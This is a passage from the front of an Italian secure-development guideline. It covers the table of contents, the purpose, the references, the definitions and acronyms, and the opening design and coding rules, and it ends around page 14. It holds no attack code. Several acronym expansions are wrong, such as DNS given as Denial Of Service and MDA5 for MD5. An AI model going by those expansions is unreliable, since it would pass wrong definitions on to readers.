 
Linee guida per lo sviluppo sicuro 
 
 
 
 
 
 
 
Linee guida per lo sviluppo sicuro 
  
 
 
Linee guida per lo sviluppo sicuro Pag. 2 a 156  
 
 
SOMMARIO  
1 INTRODUZIONE ...................................... ................................................... ................................................... ...... 7  
1.1  SCOPO  .................................................. ................................................... ................................................... ......... 7  
1.2  STRUTTURA DEL DOCUMENTO  .................................................. ................................................... .............................. 7  
2 RIFERIMENTI ....................................... ................................................... ................................................... ......... 8  
2.1  DOCUMENTI DI RIFERIMENTO  .................................................. ................................................... .............................. 8  
3 DEFINIZIONI E ACRONIMI ............................ ................................................... ................................................... . 9 
3.1  DEFINIZIONI  .................................................. ................................................... ................................................... .. 9 
3.2  ACRONIMI  .................................................. ................................................... ................................................... .... 9 
4 SVILUPPARE APPLICAZIONI SICURE .................... ................................................... ............................................12  
5 PROGETTAZIONE E SVILUPPO DELL’APPLICAZIONE: DIRETTI VE STANDARD ....................................... ................13  
5.1  PROGETTAZIONE DELL ’APPLICAZIONE  .................................................. ................................................... ................... 13  
5.2  SVILUPPO DELL ’APPLICAZIONE – CRITERI GENERALI  .................................................. ...................................................  13  
5.2.1  Performance ....................................... ................................................... ................................................... ... 13  
5.2.2  Password nel codice sorgente ...................... ................................................... ............................................ 14  
5.2.3  Privilegi esecutivi minimi ........................ ................................................... .................................................. 14  
5.2.4  Metodi TRACE e TRACK .............................. ................................................... .............................................. 14  
5.2.5  Assenza di codice malevolo ........................ ................................................... .............................................. 14  
5.2.6  Fattore integrità ................................. ................................................... ................................................... ... 14  
5.2.7  Input character validation ........................ ................................................... ................................................ 14  
5.2.8  Gestione dell’output .............................. ................................................... ...................................................  15  
5.3  FORMATTAZIONE DEL CODICE  .................................................. ................................................... ............................ 15  
5.3.1  Stile e sintassi .................................. ................................................... ................................................... ...... 15  
5.3.2  Algoritmi ......................................... ................................................... ................................................... ...... 16  
5.3.3  Utilizzo funzioni di gestione delle stringhe ...... ................................................... ......................................... 16  
5.3.4  Specifica del formato delle stringhe .............. ................................................... ........................................... 16  
5.3.5  Casting e variabili numeriche ..................... ................................................... .............................................. 16  
5.4  TRACCIAMENTO E RACCOMANDAZIONI DI “A LARM DETECTION ” ................................................. ................................... 16  
5.4.1  Tracciamento eventi ............................... ................................................... ................................................. 1 6  
5.4.2  Tracciamento eventi di “Alarm Detection” .......... ................................................... .................................... 17  
5.4.3  Scopo e campo di applicazione per eventi di “Alarm Detection” ........................................ ........................ 17  
5.4.4  Raccomandazioni generali per eventi di “Alarm Detec tion” ............................................. .......................... 17  
5.5  COMPILAZIONE DELL ’APPLICAZIONE  .................................................. ................................................... .................... 18  
5.5.1  Stack Canary ...................................... ................................................... ................................................... ... 18  
5.5.2  Correttezza del sorgente .......................... ................................................... ................................................ 18  
5.6  AMBIENTE OPERATIVO DELL ’APPLICAZIONE  .................................................. ................................................... ........... 18  
5.6.1  Separazione degli ambienti ........................ ................................................... .............................................. 18  
5.6.2  Test dell’Applicazione ............................ ................................................... ...................................................  18  
5.6.3  Strumenti ......................................... ................................................... ................................................... ..... 19  
5.6.4  Profili utente .................................... ................................................... ................................................... ..... 19  
5.6.5  Trattamento dei dati .............................. ................................................... .................................................. 19  
5.6.6  Protezione dei sorgenti e delle librerie .......... ................................................... ........................................... 19  
5.7  AUTENTICAZIONE , AUTORIZZAZIONE E GESTIONE DEGLI ACCESSI  .................................................. .................................. 19  
5.7.1  Policy standard “Everything is generally forbidden unless expressly permitted” ....................... ................ 19  
5.7.2  Assegnazione dei privilegi utente ................. ................................................... ............................................ 19  
5.7.3  Procedura di accesso dell’applicazione ............ ................................................... ........................................ 19  
5.7.4  Account standard .................................. ................................................... ...................................................  20  
5.7.5  Autorizzazione .................................... ................................................... ................................................... ... 20  
5.7.6  Generazione dei token ............................. ................................................... ................................................ 20  
5.7.7  Generazione dei cookie ............................ ................................................... ................................................ 20  
5.7.8  Contenuto del cookie .............................. ................................................... ................................................. 2 0  
5.7.9  Scadenza del cookie ............................... ................................................... .................................................. 20  
 
 
Linee guida per lo sviluppo sicuro Pag. 3 a 156  
 
5.7.10  Logout utente ..................................... ................................................... ................................................. 2 0  
5.7.11  Timeout di sessione ............................... ................................................... .............................................. 20  
5.7.12  Isolamento delle funzioni dall’applicazione ....... ................................................... .................................. 20  
5.8  PASSWORD , CHIAVI E CERTIFICATI  .................................................. ................................................... ....................... 20  
5.8.1  Gestione di password, chiavi e certificati ........ ................................................... ......................................... 21  
5.8.2  Trasmissione delle password in rete ............... ................................................... ......................................... 21  
5.8.3  Generazione/conservazione delle password nel filesy stem/DB ........................................... ....................... 21  
5.8.4  Batch Job dell’applicazione ....................... ................................................... ............................................... 21  
5.8.5  Storage dei dati applicativi ...................... ................................................... ................................................ 21  
5.8.6  Integrità delle informazioni ...................... ................................................... ................................................ 21  
5.8.7  Meccanismi di autenticazione ...................... ................................................... ............................................ 21  
5.8.8  Non ripudio delle sessioni ........................ ................................................... ................................................ 21  
5.8.9  Schemi di sicurezza e crittografici ............... ................................................... ............................................. 21  
5.8.10  Weak Keys e Collision ............................. ................................................... ............................................. 22  
5.8.11  URL cifrati ....................................... ................................................... ................................................... .. 22  
5.8.12  Normalizzazione dei dati cifrati .................. ................................................... ......................................... 22  
6 PRINCIPALI VULNERABILITÀ DERIVANTI DA ERRORI DI PRO GRAMMAZIONE: OVERVIEW ............................. ....23  
6.1  VALIDAZIONE DELL ’INPUT  .................................................. ................................................... .................................. 23  
6.1.1  Shell Execution Command ........................... ................................................... ............................................. 23  
6.1.2  File Inclusion .................................... ................................................... ................................................... ...... 24  
6.1.3  XML external entity (XXE) injection ............... ................................................... ........................................... 25  
6.1.4  Insecure Deserialization .......................... ................................................... ................................................. 2 6  
6.1.5  Cross Site Scripting (XSS) ........................ ................................................... .................................................. 26  
6.1.6  Directory Traversal ............................... ................................................... ................................................... . 27  
6.1.7  SQL Injection ..................................... ................................................... ................................................... .... 28  
6.2  SESSION MANAGEMENT  .................................................. ................................................... ................................... 29  
6.2.1  Session Stealing e Hjihacking ..................... ................................................... .............................................. 29  
6.2.1.1  Cookie ............................................ ................................................... ................................................... ................30  
6.2.1.2  Token di sessione ................................. ................................................... ................................................... ..........31  
6.2.1.3  Accesso ad aree non autorizzate ................... ................................................... ................................................... 31  
6.3  CRITTOGRAFIA  .................................................. ................................................... ................................................ 32  
6.3.1  Sniffing e algoritmi crittografici deboli ......... ................................................... ........................................... 32  
6.3.2  Brute forcing ..................................... ................................................... ................................................... .... 33  
6.3.3  Rainbow table e salt value ........................ ................................................... ............................................... 34  
6.3.4  Archiviazione insicura ............................ ................................................... .................................................. 34  
6.4  GESTIONE DEGLI ERRORI , DELLE ECCEZIONI  .................................................. ................................................... ........... 35  
6.4.1  User Enumeration .................................. ................................................... .................................................. 36  
6.4.2  Information disclosure ............................ ................................................... ................................................. 3 6  
6.4.3  Directory Listing ................................. ................................................... ................................................... ... 38  
6.4.4  Denial of Service (DoS) ........................... ................................................... .................................................. 38  
6.4.5  Race condition .................................... ................................................... ................................................... ... 39  
6.4.6  Privilege Escalation e aggiramento dei permessi ute nte ............................................... ............................. 40  
6.5  BOUND CHECKING E PROBLEMATICHE DI OVERFLOW  .................................................. .................................................. 40  
6.5.1  Stack overflow .................................... ................................................... ................................................... ... 41  
6.5.2  Off-by-one/Off-by-few ............................. ................................................... ................................................ 41  
6.5.3  Format string overflow ............................ ................................................... ................................................ 42  
6.5.4  Heap overflow ..................................... ................................................... ................................................... .. 43  
6.5.5  Integer overflow ed altri errori logici di programm azione ............................................ .............................. 45  
6.6  PROCESSI DI TRACCIAMENTO  .................................................. ................................................... ............................. 45  
6.6.1  Agevolazione delle attività malevole dell’aggressor e ................................................. ................................ 45  
6.6.2  Oscuramento delle attività dell’aggressore ........ ................................................... ..................................... 46  
7 BEST PRACTICES PER LO SVILUPPO IN SICUREZZA ....... ................................................... ...................................47  
7.1  C/C++ ............................................. ................................................... ................................................... ............ 47  
7.1.1  Cross-site scripting (XSS) ........................ ................................................... .................................................. 47  
7.1.2  Command Injection ................................. ................................................... ................................................. 4 8  
7.1.3  Connection String Injection ....................... ................................................... ............................................... 49  
 
 
Linee guida per lo sviluppo sicuro Pag. 4 a 156  
 
7.1.4  Resource Injection ................................ ................................................... ................................................... . 51  
7.1.5  SQL Injection ..................................... ................................................... ................................................... .... 52  
7.1.6  LDAP Injection .................................... ................................................... ................................................... ... 53  
7.1.7  Process control ................................... ................................................... ................................................... ... 53  
7.1.8  Ulteriori indicazioni per lo sviluppo sicuro ...... ................................................... ......................................... 54  
7.1.8.1  Dichiarazioni ..................................... ................................................... ................................................... .............54  
7.1.8.2  Utilizzo dei tipi di dati ......................... ................................................... ................................................... ...........55  
7.1.8.3  Bitfields ......................................... ................................................... ................................................... .................56  
7.1.8.4  Macro.............................................. ................................................... ................................................... ...............56  
7.1.8.5  L’operatore sizeof e il passaggio di dati come para metri ............................................. .......................................57  
7.1.8.6  Allocazione dinamica .............................. ................................................... ................................................... .......57  
7.1.8.7  Deallocazione ..................................... ................................................... ................................................... ............57  
7.1.8.8  Puntatori ......................................... ................................................... ................................................... ...............58  
7.1.8.9  Casting e problematiche di gestione delle variabili  numeriche ........................................ ...................................58  
7.1.8.10  Computazione e condizionali ....................... ................................................... ................................................... ..59  
7.1.8.11  Controllo del flusso .............................. ................................................... ................................................... ..........59  
7.1.8.12  Passaggio di argomenti ............................ ................................................... ................................................... ......59  
7.1.8.13  Valori di ritorno.................................. ................................................... ................................................... ............59  
7.1.8.14  Chiamate a funzioni ............................... ................................................... ................................................... ........60  
7.1.8.15  Files ............................................. ................................................... ................................................... ...................60  
7.1.8.16  Gestione degli errori ............................. ................................................... ................................................... .........60  
7.1.8.17  Sicurezza dell’applicazione ....................... ................................................... ................................................... .....60  
7.2  JAVA  .................................................. ................................................... ................................................... .......... 60  
7.2.1  Cross-site scripting (XSS) ........................ ................................................... .................................................. 60  
7.2.2  Code injection..................................... ................................................... ................................................... ... 61  
7.2.3  Command injection ................................. ................................................... ................................................. 6 2  
7.2.4  Connection string injection ....................... ................................................... ............................................... 63  
7.2.5  LDAP Injection .................................... ................................................... ................................................... ... 64  
7.2.6  Resource Injection ................................ ................................................... ................................................... . 65  
7.2.7  SQL injection ..................................... ................................................... ................................................... .... 66  
7.2.8  XPath injection ................................... ................................................... ................................................... ... 66  
7.2.9  XML External Entity (XXE) injection ............... ................................................... ........................................... 68  
7.2.10  Ulteriori indicazioni per lo sviluppo sicuro ...... ................................................... ..................................... 68  
7.2.10.1  Inizializzazione .................................. ................................................... ................................................... .............69  
7.2.10.2  Visibilità ........................................ ................................................... ................................................... .................70  
7.2.10.3  Modificatori ...................................... ................................................... ................................................... .............70  
7.2.10.4  Utilizzo degli oggetti mutevoli ................... ................................................... ................................................... ....70  
7.2.10.5  Definizione delle classi .......................... ................................................... ................................................... .........71  
7.2.10.6  Codice e permessi speciali ........................ ................................................... ................................................... .....71  
7.2.10.7  Esecuzione dei comandi di sistema ................. ................................................... .................................................71  
7.2.10.8  Oggetti ........................................... ................................................... ................................................... ................72  
7.2.10.9  Serializzazione e deserializzazione ............... ................................................... ................................................... ..72  
7.2.10.10  Memorizzazione delle informazioni riservate ....... ................................................... .......................................73  
7.2.10.11  Packages .......................................... ................................................... ................................................... .........73  
7.2.10.12  Gestione delle eccezioni .......................... ................................................... ................................................... .73  
7.2.10.13  Java Servlet ...................................... ................................................... ................................................... .........75  
7.3  PL/SQL ............................................ ................................................... ................................................... ........... 78  
7.3.1  Cross-site scripting (XSS) ........................ ................................................... .................................................. 78  
7.3.2  Resource Injection ................................ ................................................... ................................................... . 79  
7.3.3  SQL Injection ..................................... ................................................... ................................................... .... 79  
7.3.4  Ulteriori indicazioni per lo sviluppo sicuro ...... ................................................... ......................................... 80  
7.3.4.1  Posizionamento delle procedure PL/SQL ............. ................................................... .............................................80  
7.3.4.2  Tipologie di procedure vulnerabili ................ ................................................... ................................................... .81  
7.3.4.3  Filtraggio dei tipi di input iniettabile .......... ................................................... ................................................... ....81  
7.3.4.4  Filtro dei caratteri potenzialmente dannosi ....... ................................................... ..............................................81  
7.3.4.5  Direttive per Oracle .............................. ................................................... ................................................... .........81  
7.4  JAVASCRIPT  .................................................. ................................................... ................................................... . 83  
7.4.1  Cross Site Scripting (XSS) ........................ ................................................... .................................................. 83  
7.4.2  Client DOM Code Injection ......................... ................................................... .............................................. 84  
7.4.3  Client DOM Stored Code Injection .................. ................................................... .......................................... 85  
 
 
Linee guida per lo sviluppo sicuro Pag. 5 a 156  
 
7.4.4  Client DOM Stored XSS ............................. ................................................... ................................................ 85  
7.4.5  Client DOM XSS .................................... ................................................... ................................................... . 87  
7.5  PYTHON  .................................................. ................................................... ................................................... ..... 87  
7.5.1  Cross-site scripting (XSS) ........................ ................................................... .................................................. 87  
7.5.2  Code Injection .................................... ................................................... ................................................... ... 88  
7.5.3  Command Injection ................................. ................................................... ................................................. 8 9  
7.5.4  Connection String Injection ....................... ................................................... ............................................... 90  
7.5.5  LDAP Injection .................................... ................................................... ................................................... ... 91  
7.5.6  Resource Injection ................................ ................................................... ................................................... . 92  
7.5.7  SQL Injection ..................................... ................................................... ................................................... .... 92  
7.5.8  XPath Injection ................................... ................................................... ................................................... ... 93  
7.5.9  XML External Entity (XXE) injection ............... ................................................... ........................................... 94  
7.5.10  OS Access Violation ............................... ................................................... ............................................... 94  
7.5.11  Unsecure deserialization .......................... ................................................... ............................................ 95  
7.6  C# ................................................ ................................................... ................................................... .............. 96  
7.6.1  Cross-site scripting (XSS) ........................ ................................................... .................................................. 96  
7.6.2  Code Injection .................................... ................................................... ................................................... ... 97  
7.6.3  Command Injection ................................. ................................................... ................................................. 9 8  
7.6.4  Connection String Injection ....................... ................................................... ............................................... 99  
7.6.5  LDAP Injection .................................... ................................................... ................................................... . 101  
7.6.6  Resource Injection ................................ ................................................... .................................................. 101  
7.6.7  SQL Injection ..................................... ................................................... ................................................... .. 102  
7.6.8  XPath Injection ................................... ................................................... ................................................... . 102  
7.6.9  XML External Entity (XXE) injection ............... ................................................... ......................................... 103  
7.6.10  Ulteriori indicazioni per lo sviluppo sicuro ...... ................................................... ................................... 104  
7.6.10.1  Managed Wrapper per l'implementazione del codice na tivo .............................................. ..............................104  
7.6.10.2  Library Code che espone risorse protette........... ................................................... ............................................104  
7.6.10.3  Richieste di autorizzazione ....................... ................................................... ................................................... ...104  
7.6.10.4  Protezione dell'accesso ai metodi ................. ................................................... .................................................105  
7.6.10.5  Protezione e campi pubblici di sola lettura ....... ................................................... ..............................................106  
7.6.10.6  Esclusione di classi e membri utilizzati da codice non attendibile ................................... ..................................106  
7.6.10.7  Definizione delle classi .......................... ................................................... ................................................... .......108  
7.6.10.8  User input ........................................ ................................................... ................................................... ............108  
7.6.10.9  Concorrenza ....................................... ................................................... ................................................... ..........108  
7.6.10.10  Serializzazione e deserializzazione ............... ................................................... ..............................................109  
7.7  ASP ............................................... ................................................... ................................................... ........... 109  
7.7.1  Cross-site scripting (XSS) ........................ ................................................... ................................................ 10 9  
7.7.2  Code Injection .................................... ................................................... ................................................... . 111  
7.7.3  Command Injection ................................. ................................................... ............................................... 111  
7.7.4  Connection String Injection ....................... ................................................... ............................................. 112  
7.7.5  LDAP Injection .................................... ................................................... ................................................... . 113  
7.7.6  XPath Injection ................................... ................................................... ................................................... . 113  
7.7.7  Resource Injection ................................ ................................................... .................................................. 114  
7.7.8  SQL Injection ..................................... ................................................... ................................................... .. 114  
7.8  ASP.NET ........................................... ................................................... ................................................... ........ 115  
7.8.1  Cross-site scripting (XSS) ........................ ................................................... ................................................ 11 5  
7.8.2  Code Injection .................................... ................................................... ................................................... . 116  
7.8.3  Command Injection ................................. ................................................... ............................................... 117  
7.8.4  Connection String Injection ....................... ................................................... ............................................. 118  
7.8.5  LDAP Injection .................................... ................................................... ................................................... . 119  
7.8.6  Resource Injection ................................ ................................................... .................................................. 120  
7.8.7  SQL Injection ..................................... ................................................... ................................................... .. 120  
7.8.8  XPath Injection ................................... ................................................... ................................................... . 120  
7.8.9  Ulteriori indicazioni per lo sviluppo sicuro ...... ................................................... ....................................... 121  
7.8.9.1  ASP.NET Web Form .................................. ................................................... ................................................... ....121  
7.8.9.2  ASP.NET MVC ....................................... ................................................... ................................................... ........122  
7.9  PHP ............................................... ................................................... ................................................... ........... 123  
7.9.1  Cross-site scripting (XSS) ........................ ................................................... ................................................ 12 3  
 
 
Linee guida per lo sviluppo sicuro Pag. 6 a 156  
 
7.9.2  Code Injection .................................... ................................................... ................................................... . 124  
7.9.3  Command Injection ................................. ................................................... ............................................... 126  
7.9.4  File Disclosure ................................... ................................................... ................................................... .. 127  
7.9.5  Remote File Inclusion ............................. ................................................... ................................................ 12 7  
7.9.6  File Manipulation ................................. ................................................... .................................................. 128  
7.9.7  LDAP Injection .................................... ................................................... ................................................... . 129  
7.9.8  Reflected Injection................................ ................................................... .................................................. 130  
7.9.9  SQL Injection ..................................... ................................................... ................................................... .. 131  
7.9.10  XPath Injection ................................... ................................................... ................................................ 13 1  
7.9.11  XML External Entity (XXE) injection ............... ................................................... .................................... 132  
7.9.12  Unsecure deserialization .......................... ................................................... .......................................... 133  
7.10  VBNET ............................................. ................................................... ................................................... ......... 134  
7.10.1  Cross-site scripting (XSS) ........................ ................................................... ............................................ 134  
7.10.2  Code Injection .................................... ................................................... ................................................ 13 5  
7.10.3  Command Injection ................................. ................................................... ........................................... 136  
7.10.4  Connection String Injection ....................... ................................................... ......................................... 136  
7.10.5  LDAP Injection .................................... ................................................... ................................................ 13 7  
7.10.6  Resource Injection................................. ................................................... ............................................. 138  
7.10.7  SQL Injection ..................................... ................................................... ................................................. 1 38  
7.10.8  XPath Injection ................................... ................................................... ................................................ 13 9  
7.11  AJAX .............................................. ................................................... ................................................... ........... 139  
7.11.1  Client Dom Code Injection ......................... ................................................... ........................................ 140  
7.11.2  Client DOM Stored Code Injection .................. ................................................... ................................... 141  
7.11.3  Client Dom Stored XSS ............................. ................................................... .......................................... 141  
7.11.4  Client Dom XSS .................................... ................................................... ............................................... 143  
7.11.5  Client Resource Injection ......................... ................................................... .......................................... 143  
7.11.6  Client Second Order Sql Injection ................. ................................................... ...................................... 144  
7.11.7  Client Sql Injection .............................. ................................................... ............................................... 145  
7.11.8  Cross-Site Request Forgery (CSRF) ................. ................................................... .................................... 145  
7.12  GO ................................................ ................................................... ................................................... ........... 147  
7.12.1  Client Dom Stored XSS ............................. ................................................... .......................................... 147  
7.12.2  SQL Injection ..................................... ................................................... ................................................. 1 50  
7.12.3  Ulteriori indicazioni per lo sviluppo sicuro ...... ................................................... ................................... 151  
7.12.3.1  Validazione dell’INPUT ............................ ................................................... ................................................... .....151  
7.12.3.2  Gestione dei File ................................. ................................................... ................................................... .........152  
7.12.3.3  Gestione Sessione, Controlli Accessi e Crittografia  .................................................. ..........................................153  
7.12.3.4  Gestione degli Errori e delle Eccezioni ........... ................................................... .................................................155  
7.12.3.5  Sicurezza del Database ............................ ................................................... ................................................... ....156  
 
 
 
 
LISTA DELLE TABELLE 
Tabella 1 - Documenti di Riferimento .............. ................................................... ................................................... ............. 8  
Tabella 2 - Definizioni ........................... ................................................... ................................................... ........................ 9  
Tabella 3 - Acronimi .............................. ................................................... ................................................... ...................... 11  
 
LISTA DELLE FIGURE 
Figura 1 - Schema per la sicurezza dell’applicazion e ................................................. ................................................... .... 12  
 
  
 
 
Linee guida per lo sviluppo sicuro Pag. 7 a 156  
 
1 INTRODUZIONE 
1.1  Scopo 
Scopo del presente documento è supportare, attraver so opportune linee guida, lo sviluppo di applicazio ni 
software sicure. Queste linee guida, costituiscono un insieme di best practices da seguire, al fine pr evenire 
eventuali problematiche di sicurezza nel codice, e forniscono nel contempo uno strumento utile 
nell’individuazione di possibili vulnerabilità pres enti nel codice sorgente e le relative contromisure  da 
applicare.  
1.2  Struttura del documento 
Il presente documento è articolato come segue: 
• Il Capitolo 1 riporta le generalità e lo scopo del documento; 
• Il Capitolo 2 riporta la documentazione applicabile  e di riferimento al presente documento; 
• Il Capitolo 3 riporta le definizioni e gli acronimi  utili per la lettura del documento; 
• Il Capitolo 4 riporta un’introduzione alle applicaz ioni sicure; 
• Il Capitolo 5 fornisce un insieme di raccomandazion i generali e trasversali alle scelte 
implementative;  
• Il Capitolo 6 fornisce un elenco delle principali v ulnerabilità software, corredate da esempi puntuali  
e delle relative contromisure da adottare; 
• Il Capitolo 7 fornisce le best practices per i ling uaggi di sviluppo utilizzati (C/C++, Java, PL/SQL, 
Javascript, PyThon, C#, ASP, ASP.NET, PHP, VBNET, A JAX, GO) e delle misure da adottare al fine di 
diminuire l’esposizione verso problematiche di sicu rezza applicativa. 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 8 a 156  
 
2 RIFERIMENTI 
2.1  Documenti di Riferimento 
Rif.   Codice  Titolo  
DR -1  CWE/SANS Top 25 Most Dangerous Software Errors (cwe.mitre.org/top25/)  
DR -2  OWASP Top 10 (www.owasp.org)  
DR -3  The CERT Secure Coding Standard ( www.cert.org ) 
Tabella 1 - Documenti di Riferimento 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 9 a 156  
 
3 DEFINIZIONI E ACRONIMI 
3.1  Definizioni 
Vocabolo  Descrizione  
Ambiente di produzione  Agglomerato di sistemi, dispositivi hardware ed app licazioni in cui il software 
viene installato nella sua forma definitiva al fine  di soddisfare le richieste 
dell’operatore o dell’utente finale. 
Ambiente di sviluppo  Agglomerato di sistemi, dispositivi hardware ed app licazioni in cui il software 
viene progettato e creato. 
Ambiente di test  Agglomerato di sistemi, dispositivi hardware ed app licazioni in cui il software 
creato viene testato. 
Autenticazione Processo attraverso il quale un sistema, un utente o un programma tenta di 
confermare la sua identità ad un altro sistema o ap plicazione. 
Autorizzazione Processo di definizione dei privilegi, ruoli e perm essi di un utente su un sistema 
o un’applicazione. 
Batch Job Processo di scambio dati o informazioni che interco rre automaticamente, in 
periodi temporali prestabiliti, tra due sistemi, ap plicazioni o componenti. 
Dati critici Dati che hanno una rilevanza preponderante per l’im magine e l’operato 
aziendale (esempio cartellini di traffico telefonic o). 
Dati personali  Come da decreto legislativo 196/03: “qualunque info rmazione relativa a persona 
fisica, persona giuridica, ente od associazione, id entificati o identificabili, anche 
indirettamente, mediante riferimento a qualsiasi al tra informazione, ivi 
compreso un numero di identificazione personale”. 
Dati sensibili  Come da decreto legislativo 196/03: “Dati personali  idonei a rivelare l'origine 
razziale ed etnica, le convinzioni religiose, filos ofiche o di altro genere, le 
opinioni politiche, l'adesione a partiti, sindacati , associazioni od organizzazioni a 
carattere religioso, filosofico, politico o sindaca le, nonché i dati personali idonei 
a rivelare lo stato di salute e la vita sessuale”. 
Eccezione  Occor renza di una circostanza che altera o mira ad alter are il corso previsto o il 
normale operato di un sistema, di un’applicazione o  di una sua componente. 
Evento  Situazione riconducibile ad un’attività svolta o ad  un’eccezione causata 
dall’utente, rilevante ai fini della sicurezza del sistema e dell’Information 
Security. 
Identificazione  Meccanismo di convalida preventiva di un’azione.  
Information Gathering & 
Disclosure Processo relativo alla fuga di dati o informazioni,  causato da bug o errori nel 
software. 
Information Security  Insieme di controlli, policy, processi e procedure mirate a garantire la sicurezza 
delle informazioni in azienda. 
Offuscatore  Software che converte il codice sorgente in forma d ifficilmente interpretabile o 
non interpretabile del tutto al fine di inibire l’u tilizzo di tecniche di reverse 
engineering. 
Organizzazione  Ente locale o centrale della Pubblica Amministrazio ne  
Reverse Engineering  Processo mirato a scoprire i principi tecnologici d i un’applicazione attraverso la 
sua analisi strutturale. 
Token  Valore generato per identificare univocamente una s essione interattiva.  
Tabella 2 - Definizioni 
3.2  Acronimi 
Codice  Titolo  
 
 
Linee guida per lo sviluppo sicuro Pag. 10  a 156  
 
AES  Advanced Encryption Standard  
AgID  Agenzia per l'Italia Digitale  
ANSI  American National Standards Institute  
API  Application programming interface  
ASP  Active Server Pages  
CD  Compact Disk  
CE  Contratto Esecutivo  
CGI  Common Gateway Interface  
CQ  Contratto Quadro  
CLR  Common Language Runtime  
CSRF/XSRF  Cross -Site Request Forgery  
CSS  Cascading Style Sheets  
CWE  Common Weakness Enumeration  
DB  Database  
DDNS  Distributed Denial Of Service  
DES  Data Encryption Standard  
DNS  Denial Of Service  
DOM  Document Object Model  
DVD  Digital Versatile Disc  
ECMA  European Computer Manufacturers Association  
ESAPI  The OWASP Enterprise Security API  
FTP  File Transfer Protocol  
GPL  General Public License  
HTML  HyperText Markup Language  
HTTP  Hypertext Transfer Protocol  
HTTPS  HTTP Secure  
IoC Inversion of Control  
ISO  International Organization for Standardization  
JDBC  Java DataBase Connectivity  
JSON  JavaScript Object Notation  
JWT  JSON Web Token  
LDAP  Lightweight Directory Access Protocol  
MDA5  Message Digest 5  
MVC  Model -View -Controller  
ORM  Object -relational mapping  
OS  Operating System  
OTP  One Time Password  
PL/SQL  Programming language / Structured Query Language  
RDBMS  Relational database management system  
REST  Representational State Transfer  
RPC  Remote Procedure Call  
RTI  Raggruppamento Temporaneo di Impresa  
SHA -1 Secure Hash Algorithm.  
SOAP  Simple Object Access Protocol  
SQL  Structured Query Language  
SSH  Secure Socket Shell  
SSL  Secure Sockets Layer  
TCP  Transmission Control Protocol  
 
 
Linee guida per lo sviluppo sicuro Pag. 11  a 156  
 
TLS  Transport Layer Security  
URL  Uniform Resource Locator  
UTF  Unicode Transformation Format  
XML  eXtensible Markup Language  
XSS  Cross Site Scripting  
Tabella 3 - Acronimi  
  
 
 
Linee guida per lo sviluppo sicuro Pag. 12  a 156  
 
4 SVILUPPARE APPLICAZIONI SICURE 
La sicurezza informatica, di un’applicazione è il r isultato delle contromisure di sicurezza applicate,  nelle 
diverse fasi che compongono un qualsiasi ciclo di s viluppo adottato, per ogni livello fisico e logico 
dell’applicazione stessa. 
La figura seguente mostra, a titolo di esempio non esaustivo, uno schema di modellazione concettuale d egli 
elementi principali che intervengono in tale proces so e sui quali s’indirizzeranno le linee guida pres entate 
nel corrente documento. 
 
 
Figura 1 - Schema per la sicurezza dell’applicazion e 
 
 

 
 
Linee guida per lo sviluppo sicuro Pag. 13  a 156  
 
5 PROGETTAZIONE E SVILUPPO DELL’APPLICAZIONE: DIRETTI VE 
STANDARD  
5.1  Progettazione dell’applicazione  
L'architettura dell’applicazione deve essere proget tata e sviluppata secondo i paradigmi standard 
dell’industria del software, quali: Architettura mo nolitica (mainframe), Client server, Service Orient ed 
Architecture (SOA), ecc. 
Nel corso della fase di progettazione è necessario garantire un adeguato livello di sicurezza applicat iva e 
infrastrutturale attraverso l’analisi e la modellaz ione delle minacce relative agli applicativi coinvo lti, delle 
interfacce e degli agenti che potrebbero minacciare  il sistema. Per l’analisi della sicurezza applicat iva di 
un’architettura di sistema si adotta un approccio d ifferente a seconda che si tratti di progettazione di 
applicazioni ex-novo (approccio Secure by Design) p iuttosto che di reingegnerizzazione di applicazioni  
esistenti (approccio Security Control). Nel dettagl io: 
• PROGETTAZIONE SICURA BY DESIGN  - Durante le fasi di analisi della sicurezza appli cativa di una 
architettura di sistema (da definire o in fase di r ivisitazione) è necessaria l’attuazione di pratiche  di 
progettazione sicura attraverso l’individuazione di  requisiti di sicurezza e contromisure secondo i 
Security by Design Principles. Le pratiche di proge ttazione sicura realizzano la sicurezza delle 
informazioni attraverso un approccio di "Defense in  Depth” del layer applicativo. La “difesa in 
profondità” ha come scopo limitare al minimo i dann i in caso di attacco riuscito. In pratica, 
nell’ipotesi che un attaccante riesca a oltrepassar e il primo livello di difesa (ad esempio aggirando il 
controllo di autenticazione), ulteriori misure più restrittive devono intervenire per ostacolarne 
l’avanzata (ad esempio, restringendo al minimo i pr ivilegi d’accesso alle risorse o applicando la 
compartimentazione dell’applicazione al fine di ost acolare bloccare la propagazione dell’attacco 
all’intero sistema). 
• SECURITY CONTROL  (su applicazione esistente) – È necessario: 1) Ide ntificare, quantificare e 
risolvere i rischi di sicurezza associati ad un’int erfaccia, un'applicazione e/o un sistema esistenti.  2) 
Validare dal punto di vista della sicurezza applica tiva gli sviluppi realizzati da terze parti (sicure zza 
della supply chain). 3) Tutelare il proprio patrimo nio informativo e i dati. 
 
Le tecniche di modellazione delle minacce e d’ident ificazione delle relative contromisure, finalizzate  a 
indirizzare i requisiti di sicurezza applicativa di  un’architettura di sistema, insieme alle pratiche di 
progettazione sicura, sono trattate in dettaglio ne ll’ Allegato 4 -  Linee Guida per la modellazione delle 
minacce ed individuazione delle azioni di mitigazio ne conformi ai principi del Secure/Privacy by Desig n. 
5.2  Sviluppo dell’applicazione – Criteri Generali 
Nel corso della fase di sviluppo di un’applicazione , si raccomanda l’adozione dei criteri generali rip ortati nei 
paragrafi successivi. 
5.2.1  Performance 
Le soluzioni di programmazione impiegate devono rid urre al minimo l'impatto sulle risorse di sistema.  
È necessario: 
• non ottimizzare mai manualmente ciò che può essere ottimizzato dai compilatori; 
• per i linguaggi che accedono direttamente alla memo ria del sistema, evitare di avere puntatori 
multipli ad una determinata risorsa; 
• utilizzare i data-types appropriati (es: non utiliz zare long quando int è sufficiente);  
• utilizzare switch/case al posto di strutture nidifi cate di if; 
• porre le risorse più frequentemente utilizzate le u ne vicine alle altre; 
• allocare la memoria il più tardi possibile (costruz ione degli oggetti); 
 
 
Linee guida per lo sviluppo sicuro Pag. 14  a 156  
 
• deallocare la memoria il più presto possibile (dist ruzione degli oggetti) laddove tale operazione non 
pregiudichi la sicurezza dell’applicazione; 
• compilare il software per la piattaforma di utilizz o (es: non compilare per architettura hardware 64-
bit se non è necessario). 
5.2.2  Password nel codice sorgente 
I dati di accesso (username/password/nome db/ecc..)  ai database o a sistemi di altra natura non devono  
mai essere inseriti all'interno dei sorgenti. 
